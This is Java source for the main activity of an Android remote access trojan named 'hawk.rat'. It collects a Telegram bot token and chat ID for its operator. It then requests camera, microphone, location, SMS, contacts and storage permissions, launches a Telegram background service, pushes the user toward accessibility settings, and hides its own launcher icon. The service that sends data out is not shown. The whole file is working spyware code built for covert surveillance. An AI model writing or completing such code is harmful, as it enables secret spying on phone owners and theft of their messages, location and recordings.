package com.hawk.rat;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.Manifest;
import android.content.pm.PackageManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;
public class MainActivity extends Activity {
    private static final int REQ = 1001;
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences prefs = getSharedPreferences("hawk_prefs", MODE_PRIVATE);
        if (prefs.getString("bot_token", "").isEmpty()) showSetup(); else requestPerms();
    }
    private void showSetup() {
        LinearLayout l = new LinearLayout(this); l.setOrientation(LinearLayout.VERTICAL); l.setPadding(50, 50, 50, 50);
        TextView t = new TextView(this); t.setText("Setup"); t.setTextSize(20); l.addView(t);
        EditText e1 = new EditText(this); e1.setHint("Bot Token"); l.addView(e1);
        EditText e2 = new EditText(this); e2.setHint("Chat ID"); l.addView(e2);
        Button b = new Button(this); b.setText("Start"); b.setOnClickListener(v -> {
            if (e1.getText().toString().isEmpty() || e2.getText().toString().isEmpty()) { Toast.makeText(this, "Fill both", Toast.LENGTH_SHORT).show(); return; }
            getSharedPreferences("hawk_prefs", MODE_PRIVATE).edit().putString("bot_token", e1.getText().toString().trim()).putString("chat_id", e2.getText().toString().trim()).apply();
            requestPerms();
        }); l.addView(b);
        setContentView(l);
    }
    private void requestPerms() {
        List<String> needed = new ArrayList<>();
        String[] perms = { Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE };
        for (String p : perms) if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) needed.add(p);
        if (!needed.isEmpty()) ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ); else startAll();
    }
    @Override public void onRequestPermissionsResult(int rc, String[] p, int[] g) { super.onRequestPermissionsResult(rc, p, g); startAll(); }
    private void startAll() {
        Intent s = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s); else startService(s);
        try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); } catch (Exception ignored) {}
        try { getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP); } catch (Exception ignored) {}
        finish();
    }
}
